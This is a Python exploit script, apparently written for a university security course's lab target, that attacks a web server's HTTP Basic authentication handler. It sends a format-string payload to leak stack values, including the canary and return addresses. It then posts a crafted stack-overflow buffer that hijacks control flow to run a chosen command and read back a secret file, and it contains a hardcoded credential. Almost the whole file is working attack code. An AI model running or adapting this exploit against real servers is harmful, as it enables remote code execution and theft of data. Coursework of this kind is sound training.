url = "http://project-2.csec.chatzi.org:8000"
pas="admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"


from requests import Request, Session
import base64
import time
import requests


last = None		#teleutaio
semi_last = None	#proteleutaio
canary = None #4o apo to telos
address_3rd = None	#trito
address_9th = None

def transform_address(address):

	mybytes= address.to_bytes(4, byteorder='little')
	mystring = ""
	for b in mybytes:
		if int(b) != 0:
			mystring += '%c' % int(b)
			print(int(b))
		else:
			mystring += '%c' % 0x26
			print(0x26)
	return mystring



def set_variables():
	global last
	global semi_last
	global canary
	global address_3rd
	global address_9th

	payl = "%p %d %p %p %p %p %s %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p:psswd"

	headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8")}
	response = requests.get(url,headers = headers)

	print(response.status_code)
	mystring = response.headers['WWW-Authenticate'][13:-1].split(' ')



	last = int(mystring[-1],16)
	semi_last = int(mystring[-2],16)
	canary = int(mystring[-4],16)
	address_3rd = int(mystring[4],16)

	print(mystring[-9])
	address_9th = int(mystring[-9],16)

	time.sleep(1)

set_variables()


guessed_address=last - 0xB8	#vale to teleutaio argument 
send_file = address_9th - 0x1AA5A0 #vale to proteleutaio argument 


old_ebp = last
old_esi = 0xF7F31000 #####Could be anything
old_ebx = canary


shutdown = address_3rd - 0x1C7 + 0x32	#vres original return address of post_param

command = "lspci"

data=""
data +=  92*"!" 
data += transform_address(guessed_address + 152 + len(command))
data += 8*"!" + 4*"-" + 4*"-"+4*"!"
data += transform_address(guessed_address)
data += 4*"-" 
data +=  transform_address(canary)
data +=  transform_address(old_ebx) 
data +=  transform_address(old_esi) 
data +=  transform_address(old_ebp)
data +=  transform_address(send_file) 
data +=  transform_address(shutdown)
data +=  transform_address(guessed_address+152)
data +=  command
data += '\0'

s = Session()

req = Request('POST', url, data=data)

prepped = req.prepare()
prepped.headers['Content-Length'] = 66
prepped.headers['Authorization'] = "Basic " + base64.b64encode(pas.encode("utf-8")).decode("utf-8")
response = s.send(prepped)



content = str(response.content)[84:-1] #Content of /etc/secret

import codecs
hex_string = content

# Convert hex escape sequences to binary
decoded_string = codecs.escape_decode(hex_string)[0].decode()

# Print the converted string to a file
with open('lspci_output.txt', 'w') as file:
    file.write(decoded_string)
    print("String saved to lspci_output.txt")


